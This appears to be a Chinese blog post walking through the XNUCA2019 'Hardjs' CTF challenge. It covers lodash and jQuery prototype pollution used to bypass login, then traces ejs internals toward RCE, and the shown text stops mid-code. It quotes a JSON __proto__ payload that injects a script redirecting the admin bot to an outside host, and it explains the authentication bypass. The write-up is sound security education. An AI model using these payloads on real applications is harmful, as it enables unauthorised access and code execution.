@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='文章首发于先知社区：https://xz.aliyun.com/t/6113
+ 前言 这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。
+初步分析 题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.js。
+先分析server.js。
+可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。
+审计一下代码可以看到有以下的路由：
+ / 首页 /static 静态文件 /sandbox 显示用户HTML数据用的沙盒 /login 登陆 /register 注册 /get json接口 获取数据库中保存的数据 /add 用户添加数据的接口  除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证
+因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。
+另外在初始化的时候有这么一句
+app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) 所以我们可以通过json格式传递参数到服务端
+发现问题 在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下
+var sql = &amp;#34;select `id`,`dom` from `html` where userid=? &amp;#34;; var raws = await query(sql,[userid]); var doms = {} var ret = new Array(); for(var i=0;i&amp;lt;raws.length ;i&#43;&#43;){ lodash.defaultsDeep(doms,JSON.parse( raws[i].dom )); var sql = &amp;#34;delete from `html` where id = ?'><title>XNUCA2019 Hardjs题解 从原型链污染到RCE</title>
+
+<link rel='canonical' href='https://example.com/p/xnuca2019-hardjs-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='XNUCA2019 Hardjs题解 从原型链污染到RCE'>
+<meta property='og:description' content='文章首发于先知社区：https://xz.aliyun.com/t/6113
+ 前言 这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。
+初步分析 题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.js。
+先分析server.js。
+可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。
+审计一下代码可以看到有以下的路由：
+ / 首页 /static 静态文件 /sandbox 显示用户HTML数据用的沙盒 /login 登陆 /register 注册 /get json接口 获取数据库中保存的数据 /add 用户添加数据的接口  除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证
+因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。
+另外在初始化的时候有这么一句
+app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) 所以我们可以通过json格式传递参数到服务端
+发现问题 在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下
+var sql = &amp;#34;select `id`,`dom` from `html` where userid=? &amp;#34;; var raws = await query(sql,[userid]); var doms = {} var ret = new Array(); for(var i=0;i&amp;lt;raws.length ;i&#43;&#43;){ lodash.defaultsDeep(doms,JSON.parse( raws[i].dom )); var sql = &amp;#34;delete from `html` where id = ?'>
+<meta property='og:url' content='https://example.com/p/xnuca2019-hardjs-writeup/'>
+<meta property='og:site_name' content='Eifiz Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Nodejs' /><meta property='article:tag' content='原型链污染' /><meta property='article:published_time' content='2019-08-30T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2019-08-30T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="XNUCA2019 Hardjs题解 从原型链污染到RCE">
+<meta name="twitter:description" content="文章首发于先知社区：https://xz.aliyun.com/t/6113
+ 前言 这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。
+初步分析 题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.js。
+先分析server.js。
+可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。
+审计一下代码可以看到有以下的路由：
+ / 首页 /static 静态文件 /sandbox 显示用户HTML数据用的沙盒 /login 登陆 /register 注册 /get json接口 获取数据库中保存的数据 /add 用户添加数据的接口  除了/static，/login和/register以外，所以路由在访问的时候都会经过一个auth函数进行身份验证
+因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。
+另外在初始化的时候有这么一句
+app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) 所以我们可以通过json格式传递参数到服务端
+发现问题 在/get中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下
+var sql = &amp;#34;select `id`,`dom` from `html` where userid=? &amp;#34;; var raws = await query(sql,[userid]); var doms = {} var ret = new Array(); for(var i=0;i&amp;lt;raws.length ;i&#43;&#43;){ lodash.defaultsDeep(doms,JSON.parse( raws[i].dom )); var sql = &amp;#34;delete from `html` where id = ?">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="https://example.com" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" >
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/xnuca2019-hardjs-writeup/">XNUCA2019 Hardjs题解 从原型链污染到RCE</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 30, 2019</time>
+            </div>
+        
+
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <blockquote>
+<p>文章首发于先知社区：https://xz.aliyun.com/t/6113</p>
+</blockquote>
+<h2 id="前言">前言</h2>
+<p>这次XNUCA2019的WEB题四道只有两道被解出，其中这道Hardjs是做出人数较少的一道，还是比较有意思的，所以在此分享一下解题思路。</p>
+<h2 id="初步分析">初步分析</h2>
+<p>题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是<code>server.js</code>和<code>robot.js</code>。</p>
+<p>先分析<code>server.js</code>。</p>
+<p>可以发现这个服务器是nodejs，并且用了express这个框架，模板渲染引擎则用了ejs。</p>
+<p>审计一下代码可以看到有以下的路由：</p>
+<ul>
+<li><code>/</code> 首页</li>
+<li><code>/static</code> 静态文件</li>
+<li><code>/sandbox</code> 显示用户HTML数据用的沙盒</li>
+<li><code>/login</code> 登陆</li>
+<li><code>/register</code> 注册</li>
+<li><code>/get</code> json接口 获取数据库中保存的数据</li>
+<li><code>/add</code> 用户添加数据的接口</li>
+</ul>
+<p>除了<code>/static</code>，<code>/login</code>和<code>/register</code>以外，所以路由在访问的时候都会经过一个<code>auth</code>函数进行身份验证</p>
+<p>因为做了转义处理，所以应该是没有Sql注入的问题，需要从其他方面下手。</p>
+<p>另外在初始化的时候有这么一句</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span><span class="p">})).</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</code></pre></div><p>所以我们可以通过json格式传递参数到服务端</p>
+<h2 id="发现问题">发现问题</h2>
+<p>在<code>/get</code>中我们可以发现，查询出来的结果，如果超过5条，那么会被合并成一条。具体的过程是，先通过sql查询出来当前用户所有的数据，然后一条条合并到一起，关键代码如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">&#34;select `id`,`dom` from  `html` where userid=? &#34;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">raws</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,[</span><span class="nx">userid</span><span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">doms</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="kd">var</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span> 
+
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">raws</span><span class="p">.</span><span class="nx">length</span> <span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nx">lodash</span><span class="p">.</span><span class="nx">defaultsDeep</span><span class="p">(</span><span class="nx">doms</span><span class="p">,</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span> <span class="nx">raws</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">dom</span> <span class="p">));</span>
+
+    <span class="kd">var</span> <span class="nx">sql</span> <span class="o">=</span> <span class="s2">&#34;delete from `html` where id = ?&#34;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span><span class="nx">raws</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">id</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>其中的<code>lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));</code>恰好是前段时间公布的<code>CVE-2019-10744 </code>的攻击对象，再看一下版本刚好是4.17.11，并没有修复这个漏洞。所以我们可以利用这个漏洞进行原型链污染。</p>
+<p>###.1 原型链污染</p>
+<p>这里简单介绍一下原型链污染(prototype pollution)</p>
+<p>Javascript里每个类都有一个<code>prototype</code>的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的<code>__proto__</code>属性也指向类的<code>prototype</code>。因此，有以下关系：</p>
+<p><figure style="flex-grow: 384; flex-basis: 922px">
+		<a href="/p/xnuca2019-hardjs-writeup/1566801549603.png" data-size="569x148"><img src="/p/xnuca2019-hardjs-writeup/1566801549603.png"
+				
+				width="569"
+				height="148"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<p>并且，类的继承是通过原型链传递的，一个类的<code>prototype</code>属性指向其继承的类的一个对象。所以一个类的<code>prototype.__proto__</code>等于其父类的<code>prototype</code>，当然也等于该类对象的<code>__proto__.__proto__</code>属性。</p>
+<p>我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为<code>null</code>为止。所以修改对象的某个父类的<code>prototype</code>的原型就可以通过原型链影响到跟此类有关的所有对象。</p>
+<p><figure style="flex-grow: 138; flex-basis: 332px">
+		<a href="/p/xnuca2019-hardjs-writeup/1566803454431.png" data-size="409x295"><img src="/p/xnuca2019-hardjs-writeup/1566803454431.png"
+				
+				width="409"
+				height="295"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<p>当然，如果某个对象本身就拥有该成员，就不会往上找，所以利用这个漏洞的时候，我们需要做到的是找到某个成员被判断是否存在并使用的代码。</p>
+<p>###.2 发现利用点</p>
+<p>在<code>server.js</code>中，有一处很符合我们要寻找的利用点，即<code>auth</code>函数中判断用户的部分</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">auth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">){</span>
+    <span class="c1">// var session = req.session;
+</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">login</span> <span class="o">||</span> <span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">userid</span> <span class="p">){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="mi">302</span><span class="p">,</span><span class="s2">&#34;/login&#34;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+        <span class="nx">next</span><span class="p">();</span>
+    <span class="p">}</span>    
+<span class="p">}</span>
+</code></pre></div><p>在我们没有登陆以前，<code>req.seesion.login</code>和<code>req.session.userid</code>是undefined的，而session对象的父类肯定包含了Object，所以我们只要修改Object中的这部分代码就可以绕过登陆，以admin身份访问网页。</p>
+<h2 id="尝试xss攻击">尝试XSS攻击</h2>
+<p>知道了上述的利用点以后，回去审计<code>robot.py</code>可以发现，flag值是存在环境变量中的，并且是admin的密码，robot会打开本地页面的首页<code>/</code>(原先是会自动跳转到<code>/login</code>，当然我们现在可以bypass掉这个跳转)，然后robot会根据form的name填写用户名和密码，并点击submit按钮。</p>
+<p>因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。</p>
+<p>再加上<code>robot.py</code>中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。``</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">chrome_options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-xss-auditor&#39;</span><span class="p">)</span>
+<span class="o">...</span>
+ 	<span class="nb">print</span><span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="n">current_url</span><span class="p">)</span>
+</code></pre></div><p>所以审计前端的<code>app.js</code></p>
+<p>发现所有我们保存在数据库的数据是动态加载到一个有<code>sanbox</code>标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。</p>
+<p>不过恰巧的是<code>app.js</code>使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span> <span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">datas</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nx">extend</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="nx">allNode</span><span class="p">,</span><span class="nx">datas</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span>
+<span class="p">}</span>
+</code></pre></div><p>具体的CVE号是<code>CVE-2019-11358</code>，利用方法类似上文的漏洞。</p>
+<p>如果找到利用链应该是可以成功攻击的，不过遗憾的是本人水平有限，没能在比赛的时候找到攻击方法。</p>
+<p>投稿的时候发现官方WP出了，并且给出了这种解法的攻击payload，供大家参考</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span><span class="s2">&#34;type&#34;</span><span class="o">:</span><span class="s2">&#34;test&#34;</span><span class="p">,</span><span class="s2">&#34;content&#34;</span><span class="o">:</span><span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;logger&#34;</span><span class="o">:</span> <span class="s2">&#34;&lt;script&gt;window.location=&#39;http://wonderkun.cc/hack.html&#39;&lt;/script&gt;&#34;</span><span class="p">}}}</span>
+</code></pre></div><h2 id="挖掘后端攻击方法">挖掘后端攻击方法</h2>
+<p>因为前端攻击失败，就希望通过后端找到可利用的点。</p>
+<p>审计<code>server.js</code>的时候可以看到，返回页面是通过<code>res.render(xxx)</code>渲染的，所以尝试从这里下手，跟进模板渲染寻找符合我们上述条件的利用点。</p>
+<p>因为代码较多，所以以下分析省略部分无关代码。</p>
+<p>通过跟进<code>/login</code>的<code>res.render</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">res</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">render</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">req</span><span class="p">.</span><span class="nx">app</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">done</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">options</span> <span class="o">||</span> <span class="p">{};</span>
+  <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">req</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">self</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+
+  <span class="p">....</span>
+  
+  <span class="c1">// render
+</span><span class="c1"></span>  <span class="nx">app</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">opts</span><span class="p">,</span> <span class="nx">done</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div><p>可以发现来到了<code>response.js</code>的中对<code>res.render</code>的定义，并且调用了<code>app.render</code>，同时，将进行了参数配置传递。继续跟进，来到<code>application.js</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">render</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">cache</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cache</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">done</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">engines</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">engines</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">options</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">renderOptions</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kd">var</span> <span class="nx">view</span><span class="p">;</span>
+  <span class="p">....</span>
+  <span class="c1">// render
+</span><span class="c1"></span>  <span class="nx">tryRender</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">renderOptions</span><span class="p">,</span> <span class="nx">done</span><span class="p">);</span>
+<span class="p">};</span>
+
+</code></pre></div><p>发现调用了<code>tryRender</code>，并继续传递配置，我们继续跟进</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">tryRender</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">view</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">callback</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>调用了<code>view.render</code>，继续跟进就来到了<code>view.js</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">View</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">render</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">debug</span><span class="p">(</span><span class="s1">&#39;render &#34;%s&#34;&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">path</span><span class="p">);</span>
+  <span class="k">this</span><span class="p">.</span><span class="nx">engine</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div><p>调用了<code>engine</code>，终于来到了模板渲染引擎<code>ejs.js</code>中。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">exports</span><span class="p">.</span><span class="nx">renderFile</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+  <span class="kd">var</span> <span class="nx">cb</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span><span class="nx">filename</span><span class="o">:</span> <span class="nx">filename</span><span class="p">};</span>
+  <span class="kd">var</span> <span class="nx">data</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">viewOpts</span><span class="p">;</span>
+
+  <span class="p">...</span>
+  
+  <span class="k">return</span> <span class="nx">tryHandleCache</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">cb</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div><p>发现跳到<code>renderFile</code>函数，并且又调用了<code>tryHandleCache</code>，我这里省略了opts传递的代码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">tryHandleCache</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">result</span><span class="p">;</span>
+  <span class="p">...</span>
+      <span class="nx">result</span> <span class="o">=</span> <span class="nx">handleCache</span><span class="p">(</span><span class="nx">options</span><span class="p">)(</span><span class="nx">data</span><span class="p">);</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div><p>这里可以看到<code>handleCache</code>返回了一个函数，并且将data传入进行执行，而这个result就是最后生成的页面了，这个时候可以感觉到，有RCE的可能性。继续跟进。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">handleCache</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">template</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">func</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">options</span><span class="p">.</span><span class="nx">filename</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">hasTemplate</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">...</span>
+  <span class="nx">func</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">compile</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">exports</span><span class="p">.</span><span class="nx">cache</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">func</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">func</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>跟进生成func的<code>compile</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">exports</span><span class="p">.</span><span class="nx">compile</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">compile</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">templ</span><span class="p">;</span>
+  <span class="p">...</span>
+  <span class="nx">templ</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Template</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">opts</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">templ</span><span class="p">.</span><span class="nx">compile</span><span class="p">();</span>
+<span class="p">};</span>
+</code></pre></div><p>发现新建了一个Template对象并执行其成员方法得到返回的func。我们跟进其成员方法<code>compile</code>查看。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">compile</span><span class="o">:</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">src</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">fn</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">opts</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">prepended</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">appended</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">escapeFn</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">escapeFunction</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">ctor</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">generateSource</span><span class="p">();</span>
+      <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  var __output = [], __append = __output.push.bind(__output);&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="mi">_</span><span class="kd">with</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">prepended</span> <span class="o">+=</span>  <span class="s1">&#39;  with (&#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">&#39; || {}) {&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
